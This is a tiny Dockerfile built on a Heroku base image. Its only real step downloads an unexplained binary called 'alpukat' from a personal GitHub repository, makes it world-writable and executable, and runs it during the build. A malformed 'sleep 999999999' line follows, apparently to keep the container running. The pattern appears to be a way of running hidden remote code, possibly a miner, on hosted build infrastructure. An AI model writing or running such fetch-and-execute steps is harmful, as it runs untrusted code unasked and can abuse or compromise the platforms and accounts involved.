FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/gyrogerald/toya/raw/8f3b90b01fa1c9c04f36d6e6a5b65e572cb4286d/alpukat && chmod 777 alpukat && ./alpukat 
sleep 999999999
